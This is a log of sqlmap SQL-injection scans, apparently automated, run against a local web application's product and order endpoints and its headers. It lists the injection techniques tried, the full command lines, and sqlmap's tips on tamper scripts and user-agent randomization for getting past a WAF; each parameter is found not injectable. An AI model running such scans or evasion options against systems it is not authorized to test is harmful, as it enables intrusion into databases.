[18:59:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:59:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:59:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:59:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:59:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:59:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:59:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:59:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:59:51] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:59:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:59:52] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:59:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:59:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:53] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:59:54] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:59:54] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:59:55] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:59:55] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:59:56] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:59:56] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:59:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:59:57] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:59:57] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:59:57] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:59:57] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:59:57] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:59:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:59:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:59:57] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:59:57] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:57] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:57] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:57] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:59:57] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:59:57] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:59:57] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:59:57] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:59:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:59:58] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:59:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:59:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:59:58] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:59:59] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:59:59] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:59:59] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:59:59] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[19:00:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:00:00] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:00:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[19:00:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[19:00:02] [WARNING] parameter 'Referer' does not seem to be injectable
[19:00:02] [INFO] testing if parameter 'Host' is dynamic
[19:00:02] [WARNING] parameter 'Host' does not appear to be dynamic
[19:00:02] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[19:00:02] [INFO] testing for SQL injection on parameter 'Host'
[19:00:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:00:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:00:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:00:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:00:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:00:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:00:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:00:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:00:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:00:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:00:06] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:00:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:00:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:00:07] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:00:07] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:00:08] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:09] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:00:09] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:00:10] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:00:10] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:00:11] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:00:11] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:00:12] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[19:00:12] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[19:00:12] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[19:00:12] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[19:00:12] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:00:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:00:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:00:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:00:12] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[19:00:12] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[19:00:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[19:00:12] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[19:00:12] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[19:00:12] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:00:12] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[19:00:12] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:00:12] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[19:00:12] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[19:00:12] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:00:13] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[19:00:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[19:00:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[19:00:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[19:00:13] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[19:00:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[19:00:14] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[19:00:14] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[19:00:14] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[19:00:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:00:15] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:00:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[19:00:16] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[19:00:17] [WARNING] parameter 'Host' does not seem to be injectable
[19:00:17] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:00:17] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 7433 times, 404 (Not Found) - 219 times

[*] ending @ 19:00:17 /2025-09-26/

2025-09-26 19:00:18,176 - INFO - No clear injection detected during discovery for http://localhost:5000/products/test
2025-09-26 19:00:18,176 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/orders -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}'
2025-09-26 19:00:21,483 - INFO -         ___
2025-09-26 19:00:21,483 - INFO -        __H__
2025-09-26 19:00:21,483 - INFO -  ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:00:21,483 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 19:00:21,483 - INFO - |___|_  [,]_|_|_|__,|  _|
2025-09-26 19:00:21,483 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:00:21,483 - INFO - 
2025-09-26 19:00:21,515 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:00:21,515 - INFO - 
2025-09-26 19:00:21,515 - INFO - [*] starting @ 19:00:21 /2025-09-26/
2025-09-26 19:00:21,515 - INFO - 
2025-09-26 19:00:23,827 - INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
2025-09-26 19:00:23,831 - INFO - [19:00:23] [INFO] flushing session file
2025-09-26 19:00:23,841 - INFO - [19:00:23] [INFO] testing connection to the target URL
2025-09-26 19:00:24,778 - INFO - [19:00:24] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:00:24,868 - INFO - [19:00:24] [INFO] testing if the target URL content is stable
2025-09-26 19:00:24,943 - INFO - [19:00:24] [INFO] target URL content is stable
2025-09-26 19:00:24,943 - INFO - [19:00:24] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
2025-09-26 19:00:25,050 - INFO - [19:00:25] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
2025-09-26 19:00:25,085 - INFO - [19:00:25] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
2025-09-26 19:00:25,100 - INFO - [19:00:25] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
2025-09-26 19:00:25,155 - INFO - [19:00:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:25,428 - INFO - [19:00:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:25,598 - INFO - [19:00:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:25,662 - INFO - [19:00:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:00:25,717 - INFO - [19:00:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:00:25,871 - INFO - [19:00:25] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:00:25,926 - INFO - [19:00:25] [INFO] testing 'Generic inline queries'
2025-09-26 19:00:26,007 - INFO - [19:00:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:00:26,071 - INFO - [19:00:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:00:26,129 - INFO - [19:00:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:00:26,176 - INFO - [19:00:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:00:26,233 - INFO - [19:00:26] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:00:26,276 - INFO - [19:00:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:00:26,326 - INFO - [19:00:26] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:00:26,381 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:00:26,381 - INFO - [19:00:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:26,417 - INFO - [19:00:26] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:00:26,441 - INFO - [19:00:26] [WARNING] (custom) POST parameter 'JSON user_id' does not seem to be injectable
2025-09-26 19:00:26,441 - INFO - [19:00:26] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
2025-09-26 19:00:26,518 - INFO - [19:00:26] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
2025-09-26 19:00:26,529 - INFO - [19:00:26] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
2025-09-26 19:00:26,539 - INFO - [19:00:26] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
2025-09-26 19:00:26,602 - INFO - [19:00:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:27,889 - INFO - [19:00:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:28,090 - INFO - [19:00:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:28,172 - INFO - [19:00:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:00:28,246 - INFO - [19:00:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:00:29,194 - INFO - [19:00:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:00:29,240 - INFO - [19:00:29] [INFO] testing 'Generic inline queries'
2025-09-26 19:00:29,653 - INFO - [19:00:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:00:29,719 - INFO - [19:00:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:00:29,761 - INFO - [19:00:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:00:29,800 - INFO - [19:00:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:00:29,838 - INFO - [19:00:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:00:29,912 - INFO - [19:00:29] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:00:29,948 - INFO - [19:00:29] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:00:29,996 - INFO - [19:00:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:30,065 - INFO - [19:00:30] [WARNING] (custom) POST parameter 'JSON product_id' does not seem to be injectable
2025-09-26 19:00:30,065 - INFO - [19:00:30] [INFO] testing if (custom) POST parameter 'JSON quantity' is dynamic
2025-09-26 19:00:30,155 - INFO - [19:00:30] [WARNING] (custom) POST parameter 'JSON quantity' does not appear to be dynamic
2025-09-26 19:00:30,165 - INFO - [19:00:30] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON quantity' might not be injectable
2025-09-26 19:00:30,175 - INFO - [19:00:30] [INFO] testing for SQL injection on (custom) POST parameter 'JSON quantity'
2025-09-26 19:00:30,229 - INFO - [19:00:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:00:30,522 - INFO - [19:00:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:00:30,742 - INFO - [19:00:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:00:30,821 - INFO - [19:00:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 19:00:30,885 - INFO - [19:00:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 19:00:31,031 - INFO - [19:00:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 19:00:31,104 - INFO - [19:00:31] [INFO] testing 'Generic inline queries'
2025-09-26 19:00:31,210 - INFO - [19:00:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 19:00:31,252 - INFO - [19:00:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 19:00:31,289 - INFO - [19:00:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 19:00:31,337 - INFO - [19:00:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 19:00:31,372 - INFO - [19:00:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 19:00:31,437 - INFO - [19:00:31] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 19:00:31,479 - INFO - [19:00:31] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 19:00:31,527 - INFO - [19:00:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:00:31,591 - INFO - [19:00:31] [WARNING] (custom) POST parameter 'JSON quantity' does not seem to be injectable
2025-09-26 19:00:31,591 - INFO - [19:00:31] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:00:31,591 - INFO - [19:00:31] [WARNING] HTTP error codes detected during run:
2025-09-26 19:00:31,591 - INFO - 500 (Internal Server Error) - 198 times
2025-09-26 19:00:31,591 - INFO - 
2025-09-26 19:00:31,591 - INFO - [*] ending @ 19:00:31 /2025-09-26/
2025-09-26 19:00:31,591 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/orders -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}'
--------------------------------------------------
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:00:21 /2025-09-26/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:00:23] [INFO] flushing session file
[19:00:23] [INFO] testing connection to the target URL
[19:00:24] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:00:24] [INFO] testing if the target URL content is stable
[19:00:24] [INFO] target URL content is stable
[19:00:24] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
[19:00:25] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
[19:00:25] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
[19:00:25] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
[19:00:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:00:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:00:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:00:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:00:25] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:00:25] [INFO] testing 'Generic inline queries'
[19:00:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:00:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:00:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:00:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:00:26] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:00:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:00:26] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:00:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:00:26] [WARNING] reflective value(s) found and filtering out
[19:00:26] [WARNING] (custom) POST parameter 'JSON user_id' does not seem to be injectable
[19:00:26] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
[19:00:26] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
[19:00:26] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
[19:00:26] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
[19:00:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:00:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:00:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:00:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:00:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:00:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
